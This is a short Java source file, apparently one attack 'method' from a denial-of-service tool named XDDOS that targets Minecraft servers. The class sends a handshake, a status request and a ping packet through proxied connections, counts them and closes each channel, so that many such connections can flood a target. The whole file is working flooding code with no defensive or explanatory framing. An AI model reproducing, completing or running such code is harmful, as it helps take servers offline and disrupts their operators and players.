package XD.XDDOS.methods;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.PingPacket;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;


public class Ping
  implements Method
{
  private byte[] handshakebytes = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 1)).getWrappedPacket();

  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[] { 1, 0 }));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new PingPacket(System.currentTimeMillis())).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
